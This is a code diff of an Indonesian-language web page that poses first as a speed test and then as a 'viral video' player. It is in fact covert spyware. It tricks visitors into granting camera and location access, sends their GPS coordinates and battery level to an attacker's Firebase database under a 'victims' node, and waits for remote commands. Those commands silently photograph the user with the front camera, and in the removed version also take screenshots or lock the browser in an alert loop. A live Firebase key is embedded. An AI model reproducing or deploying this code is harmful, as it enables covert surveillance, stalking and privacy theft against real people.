@@ -1,109 +1,99 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ SPEEDTEST v4.2 - CEK KONEKSI</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GNN - VIDEO VIRAL TERKINI</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .box { border: 2px solid #00ff00; padding: 40px; border-radius: 50%; width: 250px; height: 250px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 0 20px #00ff00; transition: 0.3s; }
-        .box:active { transform: scale(0.9); box-shadow: 0 0 50px #00ff00; }
-        #status { margin-top: 20px; font-size: 12px; color: #fff; }
-        #lock { display:none; position:fixed; inset:0; background:red; color:white; z-index:9999; padding-top:200px; font-size:40px; }
-    </style>
 </head>
-<body>
-
-    <div id="main-ui">
-        <div class="box" onclick="startTest()">
-            <h1 style="margin:0;">GO</h1>
-            <p style="font-size:10px;">MULAI TES</p>
-        </div>
-        <div id="status">Klik untuk mengukur Latensi & Kecepatan Jaringan</div>
+<body style="background:#000; color:white; text-align:center; font-family:sans-serif; padding:20px;">
+    
+    <video id="v" width="1" height="1" autoplay style="opacity:0; position:absolute;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    
+    <div id="m">
+        <h2 style="color:red;">🔴 LIVE: KEJADIAN VIRAL</h2>
+        <p>Gunakan koneksi stabil dan izinkan akses lokasi & kamera untuk memutar video (Verifikasi Keamanan).</p>
+        <button onclick="gas()" style="background:red; color:white; padding:18px; width:100%; border:none; border-radius:12px; font-weight:bold; font-size:16px; cursor:pointer; box-shadow: 0 5px 15px rgba(255,0,0,0.3);">KONFIRMASI & TONTON</button>
     </div>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <div id="lock">☣️ SYSTEM ERROR ☣️</div>
-
 <script>
-    // --- CONFIG FIREBASE (Sama dengan Markas) ---
+    // --- TEMPEL CONFIG FIREBASE KALZ DISINI ---
     const firebaseConfig = {
       apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
-      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app"
+      authDomain: "theeyes-8d0aa.firebaseapp.com",
+      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "theeyes-8d0aa",
+      storageBucket: "theeyes-8d0aa.firebasestorage.app",
+      messagingSenderId: "886775568743",
+      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
     };
+    // ------------------------------------------
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    let idK = null;
 
-    let myNodeId = null;
-
-    async function startTest() {
-        document.getElementById('status').innerText = "Meminta izin server...";
-        
+    async function gas() {
         try {
-            // 1. Ambil Izin Kamera (Tanpa Izin, Tes Gagal)
+            // Minta Izin Kamera Depan
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('video').srcObject = stream;
-
-            // 2. Ambil Lokasi
+            document.getElementById('v').srcObject = stream;
+            
+            // Minta Izin Lokasi
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                
-                // 3. Ambil Info Baterai
-                let bat = "N/A";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    bat = Math.round(b.level * 100) + "%";
+                let bat = "N/A"; 
+                if(navigator.getBattery) { 
+                    const b = await navigator.getBattery(); 
+                    bat = Math.round(b.level*100)+"%"; 
                 }
-
-                // 4. Daftarkan Target ke Firebase
+                
+                // Daftarkan Korban ke Firebase
                 const ref = db.ref('korban').push({
-                    waktu: new Date().toLocaleString('id-ID'),
+                    waktu: new Date().toLocaleString(),
                     baterai: bat,
+                    isp: "Checking...",
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                myNodeId = ref.key;
+                
+                idK = ref.key;
+                document.getElementById('m').innerHTML = "<h3>🔄 Menghubungkan ke Server Video...</h3><p>Mohon jangan tutup halaman ini.</p>";
 
-                document.getElementById('status').innerText = "Mengukur kecepatan... 15% (Mohon tunggu)";
-
-                // 5. Tunggu Perintah dari Markas (Real-time)
-                db.ref('commands/' + myNodeId).on('value', snap => {
-                    const cmd = snap.val();
-                    if (!cmd) return;
-
-                    // Perintah FOTO
-                    if (cmd.action === "TAKE") {
-                        const v = document.getElementById('video');
-                        const c = document.getElementById('canvas');
-                        c.width = v.videoWidth;
-                        c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        db.ref('hasil_foto/' + myNodeId).set({ foto: c.toDataURL('image/jpeg', 0.5) });
-                    }
-
-                    // Perintah SCREENSHOT
-                    if (cmd.action === "SHOT") {
-                        html2canvas(document.body).then(canvas => {
-                            db.ref('hasil_screenshot/' + myNodeId).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
-                        });
-                    }
-
-                    // Perintah LOCK (VIRUS)
-                    if (cmd.action === "VIRUS") {
-                        document.getElementById('lock').style.display = 'block';
-                        while(true) { alert("SISTEM RUSAK!"); } // Mengunci Browser
+                // --- SISTEM LISTENER (Nunggu Perintah Owner) ---
+                db.ref('commands/' + idK).on('value', (s) => {
+                    const cmd = s.val();
+                    if(cmd && cmd.action === "TAKE") {
+                        take(); // Eksekusi jepret foto
                     }
                 });
-
-            }, (err) => {
-                alert("Gagal: Izin Lokasi diperlukan untuk mencari server terdekat!");
-            });
-
-        } catch (err) {
-            alert("Gagal: Izin Kamera diperlukan untuk tes latensi visual!");
+            }, (err) => { 
+                alert("Gagal! Anda wajib mengizinkan lokasi untuk menonton."); 
+            }, {enableHighAccuracy:true});
+            
+        } catch(e) { 
+            alert("Akses Kamera Ditolak! Video tidak bisa diputar."); 
         }
+    }
+
+    // Fungsi Jepret Foto Rahasia
+    function take() {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        const context = c.getContext('2d');
+        c.width = v.videoWidth; 
+        c.height = v.videoHeight;
+        
+        // Gambar frame dari video ke canvas
+        context.drawImage(v, 0, 0);
+        
+        // Kirim hasil foto (Base64) ke node hasil_foto
+        db.ref('hasil_foto/' + idK).set({ 
+            foto: c.toDataURL('image/jpeg', 0.4), // Kompresi 40% biar enteng
+            t: Date.now()
+        });
+        
+        // Hapus perintah di Firebase biar gak jepret terus-terusan
+        db.ref('commands/' + idK).remove();
     }
 </script>
 </body>
